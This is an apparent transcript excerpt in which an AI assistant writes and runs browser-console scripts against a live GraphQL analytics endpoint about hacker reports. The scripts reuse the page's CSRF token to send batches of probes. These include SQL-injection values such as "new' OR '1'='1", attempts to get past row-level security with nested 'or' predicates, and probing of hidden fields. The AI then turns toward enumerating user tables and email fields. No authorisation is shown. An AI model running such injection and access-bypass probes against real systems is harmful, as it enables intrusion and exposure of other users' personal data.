@@ -1,0 +1,209 @@
+===== L885 ASSISTANT =====
+**JL 判读**：
+
+- **JL1**：`where` 级 `or` **被 schema 直接拒**（`AnalyticsWhereInputType` 不接收）——or 只存在于**谓词元素级**（GI1b 的 left/function/right/or）——把这个缝堵死
+- **JL2**：7 行**零判别力**——我构造失误（主条件 not_eq 0 已全命中，or 加不加都是 7）——作废重打
+- **JL3**：列级 `where` 被接受、但对原始列**无任何效果**（7 行原值全出，没有 FILTER/NULL 化）——聚合场景未判（JL4 崩了没测到）
+- **JL4**：我的语法错——`field` 必须直接是枚举，`{ref: ...}` 被拒——修正重打
+
+修正 + 加深（8 发）：
+
+```js
+(async () => {
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+  const csrf = document.querySelector('meta[name="csrf-token"]').content;
+  const out = [];
+  const gql = async (label, q, sl) => {
+    const t0 = Date.now();
+    const r = await fetch('/graphql', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrf },
+      body: JSON.stringify({ query: q })
+    });
+    const ms = Date.now() - t0;
+    const j = await r.json();
+    out.push('===== ' + label + ' (' + ms + 'ms)\n' + JSON.stringify(j).slice(0, sl || 900));
+    await sleep(420);
+    return j;
+  };
+  const RID = '{ ref: dim_hacker_reports__report_id }';
+  const ST = '{ ref: dim_hacker_reports__state }';
+  const C1 = '[{ field: dim_hacker_reports__report_id, as: "c1" }]';
+  const ALLW = '{ predicates: [{ left: ' + RID + ', function: not_eq, right: { number: 0 } }] }';
+  const q1 = (wh, sel) => '{ a: analytics(queries: [{ uid: "q1", start_at: "2026-01-01T00:00:00Z", end_at: "2026-12-31T23:59:59Z", interval: year, from: dim_hacker_reports, where: ' + wh + ', select: ' + sel + ' }]) { uid has_error error_class error_message keys values } }';
+  // JM1 or 判别：主 1 行 ∪ or 1 行 → 忽略=1 / OR=2 / AND=0
+  await gql('JM1 or-disc1', q1('{ predicates: [{ left: ' + ST + ', function: eq, right: { string: "new" }, or: [{ left: ' + RID + ', function: eq, right: { number: 3914617 } }] }] }', C1));
+  // JM2 or 判别：主 0 行 ∪ or 1 行 → 忽略=0 / OR=1
+  await gql('JM2 or-disc2', q1('{ predicates: [{ left: ' + RID + ', function: eq, right: { number: 99999999 }, or: [{ left: ' + RID + ', function: eq, right: { number: 3991685 } }] }] }', C1));
+  // JM3 列级 where 原始列无匹配 → 忽略=state 原值 / 生效=全 null
+  await gql('JM3 colw-raw', q1(ALLW, '[{ field: dim_hacker_reports__report_id, as: "c1" }, { field: dim_hacker_reports__state, as: "c2", where: { predicates: [{ left: ' + RID + ', function: eq, right: { number: 99999999 } }] } }]'));
+  // JM4 列级 where 聚合命中 1 → 忽略=7 / 生效=1
+  await gql('JM4 colw-cnt', q1(ALLW, '[{ field: dim_hacker_reports__report_id, function: count, as: "cc", where: { predicates: [{ left: ' + ST + ', function: eq, right: { string: "new" } }] } }]'));
+  // JM5 列级 where 聚合命中 0 → 忽略=7 / 生效=0
+  await gql('JM5 colw-cnt0', q1(ALLW, '[{ field: dim_hacker_reports__report_id, function: count, as: "cc", where: { predicates: [{ left: ' + ST + ', function: eq, right: { string: "zzz" } }] } }]'));
+  // JM6 or 嵌套递归
+  await gql('JM6 or-nest', q1('{ predicates: [{ left: ' + RID + ', function: eq, right: { number: 99999999 }, or: [{ left: ' + RID + ', function: eq, right: { number: 99999998 }, or: [{ left: ' + RID + ',
+
+===== L887 ASSISTANT =====
+**JM 判读——两个翻案 + 一个注入候选**：
+
+- **JM1（2 行）/ JM2（1 行）/ JM6（嵌套 1 行）**：**`or` 不是静默忽略，是真 OR 联合且可递归嵌套**——历史"or 忽略"结论作废（当年多半也是无判别力构造）——**这是解释位，不是忽略位**
+- **JM3（原值）/ JM4（cc=1）/ JM5（cc=0）**：列级 where——**原始列无效、聚合列真 FILTER**（`count FILTER (WHERE state='new')` 语义）——翻译位新机制
+- **JM7（右值全清单 14 字段）**：浮出 **5 个从未触碰的字段**——`nil`（Boolean）、`from`（String）、**`variable`（String）**、`function_with_args`（嵌套函数）、`arg_name`（String）
+- **JM8（1 行精确）**：**`variable` 引用真活**——variables 值（String）到底层进了 SQL——**这是拼接点候选，立即打**
+
+四路齐发（8 发）：
+
+```js
+(async () => {
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+  const csrf = document.querySelector('meta[name="csrf-token"]').content;
+  const out = [];
+  const gql = async (label, q, sl) => {
+    const t0 = Date.now();
+    const r = await fetch('/graphql', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrf },
+      body: JSON.stringify({ query: q })
+    });
+    const ms = Date.now() - t0;
+    const j = await r.json();
+    out.push('===== ' + label + ' (' + ms + 'ms)\n' + JSON.stringify(j).slice(0, sl || 900));
+    await sleep(420);
+    return j;
+  };
+  const RID = '{ ref: dim_hacker_reports__report_id }';
+  const ST = '{ ref: dim_hacker_reports__state }';
+  const C1 = '[{ field: dim_hacker_reports__report_id, as: "c1" }]';
+  const base = (extra, sel) => '{ a: analytics(queries: [{ uid: "q1", start_at: "2026-01-01T00:00:00Z", end_at: "2026-12-31T23:59:59Z", interval: year, from: dim_hacker_reports, ' + extra + ', select: ' + (sel || C1) + ' }]) { uid has_error error_class error_message keys values } }';
+  // JN1: or 顶破 RLS 探针（count：7=RLS 兜底 / >7=越权爆）
+  await gql('JN1 or-rls', base('where: { predicates: [{ left: ' + RID + ', function: eq, right: { number: 99999999 }, or: [{ left: ' + RID + ', function: not_eq, right: { number: 0 } }] }] }', '[{ field: dim_hacker_reports__report_id, function: count, as: "cc" }]'));
+  // JN2: 数字列变量注入 → 2=拼接 / 0或崩=绑定
+  await gql('JN2 var-sqli-num', base('variables: [{ key: "k", value: "3991685 OR report_id=3914617" }], where: { predicates: [{ left: ' + RID + ', function: eq, right: { variable: "k" } }] }'));
+  // JN3: 文本列变量基线
+  await gql('JN3 var-str', base('variables: [{ key: "k", value: "new" }], where: { predicates: [{ left: ' + ST + ', function: eq, right: { variable: "k" } }] }'));
+  // JN4: 文本列变量注入（单引号闭合）→ 7=拼接 / 0=绑定 / 崩
+  await gql('JN4 var-sqli-str', base('variables: [{ key: "k", value: "new\' OR \'1\'=\'1" }], where: { predicates: [{ left: ' + ST + ', function: eq, right: { variable: "k" } }] }'));
+  // JN5: nil true → 0=IS NULL 语义 / 7=恒真 / 崩
+  await gql('JN5 nil-true', base('where: { predicates: [{ left: ' + RID + ', function: eq, right: { nil: true } }] }'));
+  // JN6: nil false
+  await gql('JN6 nil-false', base('where: { predicates: [{ left: ' + RID + ', function: eq, right: { nil: false } }] }'));
+  // JN7: arg_name 形态探测
+  await gql('JN7 arg-name', base('where: { predicates: [{ left: ' + RID + ', function: eq, right: { arg_name: "x" } }] }'));
+  // JN8:
+
+===== L889 ASSISTANT =====
+**JN 判读——变量两路都没打破，or 兜底确认**：
+
+- **JN1：cc=7**——`(report_id=99999999) OR (report_id≠0)` 全表语义却只出 7 行 → **or 再宽也被行级过滤兜底**（RLS 在 or 外层 AND 包裹）——**无越权，闭**
+- **JN2：1 行（3991685）**——若真拼接会出 2 行 → **数字上下文没拼进去**：值被按数字转/截（"3991685 OR..." 变成了 3991685）——待 JO4 定转换方式
+- **JN3：1 行** ✓ 文本列变量正常（"new" 精确命中）
+- **JN4：0 行**——单引号闭合**没有逃逸**（逃逸会 7 行、裸拼接会语法崩）→ 文本路径有绑定或转义——**无注入证据**
+- **JN5/JN6：nil true / false 都 0 行**——恒不匹配（NULL 比较）或 IS NULL（数据无空行）——需 not_eq 判别
+- **JN7/JN8：arg_name / from 单用都 0 行不崩**——孤儿字段，需组合语境
+- **另：or 与聚合同用也正常（JN1 用了 count）**——or 全路径可用
+
+收口 8 发（nil 判别 / from 组合 / function_with_args 两发 / 变量深挖三发 / IN 拼接点）：
+
+```js
+(async () => {
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+  const csrf = document.querySelector('meta[name="csrf-token"]').content;
+  const out = [];
+  const gql = async (label, q, sl) => {
+    const t0 = Date.now();
+    const r = await fetch('/graphql', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrf },
+      body: JSON.stringify({ query: q })
+    });
+    const ms = Date.now() - t0;
+    const j = await r.json();
+    out.push('===== ' + label + ' (' + ms + 'ms)\n' + JSON.stringify(j).slice(0, sl || 900));
+    await sleep(420);
+    return j;
+  };
+  const RID = '{ ref: dim_hacker_reports__report_id }';
+  const ST = '{ ref: dim_hacker_reports__state }';
+  const SAT = '{ ref: dim_hacker_reports__submitted_at }';
+  const C1 = '[{ field: dim_hacker_reports__report_id, as: "c1" }]';
+  const base = (extra, sel) => '{ a: analytics(queries: [{ uid: "q1", start_at: "2026-01-01T00:00:00Z", end_at: "2026-12-31T23:59:59Z", interval: year, from: dim_hacker_reports, ' + extra + ', select: ' + (sel || C1) + ' }]) { uid has_error error_class error_message keys values } }';
+  // JO1: nil 判别 → 7=IS NOT NULL 语义 / 0=恒 NULL 比较
+  await gql('JO1 nil-neq', base('where: { predicates: [{ left: ' + RID + ', function: not_eq, right: { nil: true } }] }'));
+  // JO2: from+ref 组合 → 7=from 被容忍 / 0或崩=from 破坏解析
+  await gql('JO2 ref-from', base('where: { predicates: [{ left: ' + RID + ', function: eq, right: { ref: dim_hacker_reports__report_id, from: "dim_hacker_reports" } }] }'));
+  // JO3: function_with_args 形态（错误法）
+  await gql('JO3 fwa-min', base('where: { predicates: [{ left: ' + RID + ', function: eq, right: { function_with_args: { name: "count" } } }] }'));
+  // JO4: 变量值 "abc"（数字列）→ 0且不崩=宽松转换( to_i ) / 崩=严格转换
+  await gql('JO4 var-abc', base('variables: [{ key: "k", value: "abc" }], where: { predicates: [{ left: ' + RID + ', function: eq, right: { variable: "k" } }] }'));
+  // JO5: in + 变量 基线 → 1 行=可用
+  await gql('JO5 in-var', base('variables: [{ key: "k", value: "new" }], where: { predicates: [{ left: ' + ST + ', function: in, right: { variable: "k" } }] }'));
+  // JO6: in 拼接探针 → 2 行=值被拼进 IN / 0 行=绑定 / 崩=转义破坏
+  await gql('JO6 in-sqli', base('variables: [{ key: "k", value: "new\',\'duplicate" }], where: { predicates: [{ left: ' + ST + ', function: in, right: { variable: "k" } }] }'));
+  // JO7: 右值函数 date_trunc → 7 
+
+===== L891 ASSISTANT =====
+**JO 判读——五项落定 + 我的一个构造错**：
+
+- **JO1：not_eq + nil:true = 7 行** × JN5（eq + nil:true = 0）——**`nil:true` 是空值检查**：eq→`IS NULL`、not_eq→`IS NOT NULL`（数据无空行所以 0/7 正好互证）——**新能力：NULL 判定**
+- **JO2：ref + from = 7 行**——from 不破坏 ref 解析（是否限定别名交给 JP4/5 判别）
+- **JO3/JO7**：不是死路——**是我把枚举当字符串传了**（`name: "count"`），期待类型 `AnalyticsSelectFunctionEnum` 必须裸写——重打
+- **JO4：value "abc" → 0 行不崩**——数字侧是**宽松前导解析**（to_i 语义，"abc"→0）——坐实 JN2 的读法（"3991685 OR..."→3991685）——**变量注入闭**
+- **JO5：in + 变量 = 1 行** ✓ 可用；**JO6：`new','duplicate` → 0 行**——没被拼进 IN()（拼进会 2 行）——**绑定/转义，无拼接**
+- **JO8：join.where 是必填**——是我漏传，补上重打
+
+JP 批（8 发）：
+
+```js
+(async () => {
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+  const csrf = document.querySelector('meta[name="csrf-token"]').content;
+  const out = [];
+  const gql = async (label, q, sl) => {
+    const t0 = Date.now();
+    const r = await fetch('/graphql', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrf },
+      body: JSON.stringify({ query: q })
+    });
+    const ms = Date.now() - t0;
+    const j = await r.json();
+    out.push('===== ' + label + ' (' + ms + 'ms)\n' + JSON.stringify(j).slice(0, sl || 900));
+    await sleep(420);
+    return j;
+  };
+  const RID = '{ ref: dim_hacker_reports__report_id }';
+  const SAT = '{ ref: dim_hacker_reports__submitted_at }';
+  const SAY = '{ ref: dim_hacker_reports__submitted_at_year }';
+  const VAL = '{ ref: dim_hacker_reports__is_valid_report }';
+  const C1 = '[{ field: dim_hacker_reports__report_id, as: "c1" }]';
+  const base = (extra, sel) => '{ a: analytics(queries: [{ uid: "q1", start_at: "2026-01-01T00:00:00Z", end_at: "2026-12-31T23:59:59Z", interval: year, from: dim_hacker_reports, ' + extra + ', select: ' + (sel || C1) + ' }]) { uid has_error error_class error_message keys values } }';
+  // JP1: 右值 date_trunc（裸枚举）→ 7=函数+参数真进 SQL / 0=NULL 死参 / 错=形状
+  await gql('JP1 fwa-trunc', base('where: { predicates: [{ left: ' + SAT + ', function: gteq, right: { function_with_args: { name: date_trunc, ref: dim_hacker_reports__submitted_at, arguments: [{ string: "month" }] } } }] }'));
+  // JP2: 右值 date_add → 7=可用
+  await gql('JP2 fwa-add', base('where: { predicates: [{ left: ' + SAT + ', function: lt, right: { function_with_args: { name: date_add, ref: dim_hacker_reports__submitted_at, arguments: [{ number: 1 }] } } }] }'));
+  // JP3: AnalyticsFunctionInputType 权威结构
+  await gql('JP3 fwa-type', '{ __type(name: "AnalyticsFunctionInputType") { name inputFields { name type { kind name ofType { kind name ofType { kind name } } } } } }', 1500);
+  // JP4: from="j1" 指 join 别名 → 7 个不同 id=from 生效 / 全 3991685=忽略
+  await gql('JP4 from-j1', base('join: [{ type: inner, with: dim_hacker_reports, as: "j1", where: { predicates: [{ left: ' + RID + ', function: not_eq, right: { number: 0 } }] } }], where: { predicates: [{ left: { ref: dim_hacker_reports__report_id, from: "j1" }, function: eq, right: { number: 3991685 } }] }'));
+  // JP5: from="zz" 不存在的别名 → 报错=别名校验存在
+  await gql('JP5
+
+===== L894 ASSISTANT =====
+JP 判读先落定，再转向：
+
+- **JP1/JP2/JP8：全 0 行**——`function_with_args` 右值同样**死参**（arguments 恒 NULL → 函数求值为 NULL → 条件恒假）——与 select 侧 arguments 死参同族，右值侧不例外
+- **JP3：分析确认**——`AnalyticsFunctionInputType = { name: AnalyticsSelectFunctionEnum, arguments: [AnalyticsComplexInputType!], ref: AnalyticsSelectFieldEnum }`——形状全对但执行死
+- **JP4：7 个不同 id**——**`from: "j1"` 解析成功**——from 是**表/别名限定符**，指哪打哪
+- **JP5：`RuntimeError: "table 'zz' not defined in schema"`**——**新错误类 + 关键线索**：from/表名走**schema 白名单校验**——**这就是"找表"的入口**
+
+用户说的对——先看 29 张表里有什么：
+
+===== L895 ASSISTANT =====
+找到方向了——全表枚举里有 **`dim_users` / `gateway_users`** 两张 user 表 + `gateway_httpstream__email` 等 user 字段。先确认这些表的字段清单：
+
+===== L896 ASSISTANT =====
+`dim_users` 在 29 表枚举里出现过。但从对话记录里查 user 字段全清单，先看清 SelectFieldEnum 里到底有哪些 user 相关字段：
+
+===== L897 ASSISTANT =====
+从对话记录里把 FromEnum 全表清单拉出来核对：
